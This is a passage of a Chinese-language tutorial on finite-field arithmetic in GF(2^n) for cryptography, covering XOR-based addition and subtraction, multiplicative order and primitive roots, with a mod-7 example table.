cjk_fallback">，</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">码</span><span class="mord cjk_fallback">学</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">常</span><span class="mord cjk_fallback">常</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<h2 id="有限域上的加法结构"><a class="anchor" href="#有限域上的加法结构">#</a> 有限域上的加法结构</h2>
<p>GF (2^n) 上的加法即为 GF (2) 上多项式的加法，具体是将 GF (2) 上多项式的系数分别相加。而对于 GF (2) 上的元素，加法即为异或运算。所以，GF (2n) 上的加法运算即为按位异或运算</p>
<p>GF (2^n) 上的减法即为 GF (2) 上多项式的减法。具体是将 GF (2) 上多项式的系数分别相减。而对于 GF (2) 上的元素，减法即为加法。所以，GF (2^n) 上的减法即为 GF (2^n) 上的加法</p>
<p>多项式加减法实际上就等价于多项式对于二进制串的按位异或运算</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">(x^2+1)+(x^2+x+1)=x
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>10</mn><msub><mn>1</mn><mn>2</mn></msub><mo>⊕</mo><mn>11</mn><msub><mn>1</mn><mn>2</mn></msub><mo>=</mo><mn>01</mn><msub><mn>0</mn><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">101_{2}⊕111_{2}=010_{2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre># 不可约多项式 poly = 0b100011011</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>0x89 + 0x4d = 0xc4</pre></td></tr><tr><td data-num="4"></td><td><pre>0xaf + 0x3b = 0x94</pre></td></tr><tr><td data-num="5"></td><td><pre>0x35 + 0xc6 = 0xf3</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>0x89 - 0x4d = 0xc4</pre></td></tr><tr><td data-num="8"></td><td><pre>0xaf - 0x3b = 0x94</pre></td></tr><tr><td data-num="9"></td><td><pre>0x35 - 0xc6 = 0xf3</pre></td></tr></table></figure><h2 id="有限域上的乘法结构"><a class="anchor" href="#有限域上的乘法结构">#</a> 有限域上的乘法结构</h2>
<p>有限域加减就是异或，但乘法要更复杂一点</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>记</mtext><mi>q</mi><mo>=</mo><msup><mi>p</mi><mi>m</mi></msup><mo separator="true">,</mo><mi>F</mi><mo>=</mo><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>F</mi><mo>∗</mo><mo>=</mo><mi>F</mi><mo>−</mo><mo stretchy="false">{</mo><mn>0</mn><mo stretchy="false">}</mo><mtext>。</mtext><mspace linebreak="newline"></mspace><mtext>对任意的</mtext><mi>α</mi><mo>∈</mo><msup><mi>F</mi><mo>∗</mo></msup><mo separator="true">,</mo><mtext>构造</mtext><mi>α</mi><mtext>的幂</mtext><msup><mi>α</mi><mn>0</mn></msup><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>α</mi><mo separator="true">,</mo><msup><mi>α</mi><mn>2</mn></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mtext>由乘法封闭性，每个</mtext><msup><mi>α</mi><mi>i</mi></msup><mo>∈</mo><msup><mi>F</mi><mo>∗</mo></msup><mi mathvariant="normal">.</mi><mtext>但</mtext><msup><mi>F</mi><mo>∗</mo></msup><mtext>中的元素有限，幂序列一定存在重复</mtext></mrow><annotation encoding="application/x-tex">记q=p^m,F=GF(q),F*=F-\lbrace0\rbrace。\\对任意的\alpha\in F^*,构造\alpha的幂\alpha^0=1,\alpha,\alpha^2,...,由乘法封闭性，每个\alpha^i\in F^*.但F^*中的元素有限，幂序列一定存在重复
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">记</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">∗</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mclose">}</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">幂</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0691039999999998em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">封</span><span class="mord cjk_fallback">闭</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">每</span><span class="mord cjk_fallback">个</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8746639999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.738696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mord">.</span><span class="mord cjk_fallback">但</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">幂</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">重</span><span class="mord cjk_fallback">复</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>设</mtext><msup><mi>α</mi><mi>k</mi></msup><mo>=</mo><msup><mi>α</mi><mrow><mi>k</mi><mo>+</mo><mi>t</mi></mrow></msup><mtext>是首次重复值，则</mtext><msup><mi>α</mi><mi>t</mi></msup><mo>=</mo><mn>1</mn><mtext>，</mtext><mi>t</mi><mtext>就是</mtext><mi>α</mi><mtext>的阶</mtext><msub><mi>δ</mi><mi>q</mi></msub><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mtext>，称</mtext><mi>α</mi><mtext>为</mtext><mi>t</mi><mtext>次单位原根；且</mtext><msub><mi>δ</mi><mi>q</mi></msub><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mo>=</mo><mi>q</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">设\alpha^k=\alpha^{k+t}是首次重复值，则\alpha^t=1，t就是\alpha的阶\delta_{q}(\alpha)，称\alpha为t次单位原根；且\delta_{q}(\alpha)=q-1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">设</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">重</span><span class="mord cjk_fallback">复</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.843556em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">阶</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">称</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">原</span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">且</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<p>普及一下原根，每个素数 p 均存在模 p 的原根</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>设</mtext><mi>m</mi><mo>∈</mo><mi>N</mi><mtext>，</mtext><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mtext>使得</mtext><msup><mi>a</mi><mi>d</mi></msup><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>m</mi><mtext>成立的最小正整数</mtext><mi>d</mi><mtext>称为</mtext><mi>a</mi><mtext>对模</mtext><mi>m</mi><mtext>的指数</mtext><mo stretchy="false">(</mo><mtext>阶</mtext><mo stretchy="false">)</mo><mtext>，</mtext><mspace linebreak="newline"></mspace><mtext>记为</mtext><msub><mi>δ</mi><mi>m</mi></msub><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><mtext>若</mtext><msub><mi>δ</mi><mi>m</mi></msub><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>称</mtext><mi>a</mi><mtext>是模</mtext><mi>m</mi><mtext>的原根</mtext></mrow><annotation encoding="application/x-tex">设m\in N，(a,m)=1,使得a^d\equiv1modm成立的最小正整数d称为a对模m的指数(阶)，\\记为\delta_{m}(\alpha).\\若\delta_{m}(\alpha)=\phi(m),称a是模m的原根
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">设</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">，</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">立</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">数</span><span class="mopen">(</span><span class="mord cjk_fallback">阶</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">称</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">原</span><span class="mord cjk_fallback">根</span></span></span></span></span></p>
<p>例如</p>
<p>m=7,phi(7)=6</p>
<table>
<thead>
<tr>
<th style="text-align:center">a</th>
<th style="text-align:center">-3</th>
<th style="text-align:center">-2</th>
<th style="text-align:center">-1</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">阶</td>
<td style="text-align:center">3</td>
<td style="text-align:center">6</td>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
<td style="text-align:center">3</td>
<td style="text-align:center">6</td>
</tr>
</tbody>
</table>
<p>可见 - 2，3 是原根</p>
<p>回到正题，任一有限域的全体非 0 元素在域的乘法运算下构成循环群，若能找到 F * 的一个原根，则 F * 的所有元素都可由原根的幂得到 (Gauss 算法求原根)</p>
<p>例如</p>
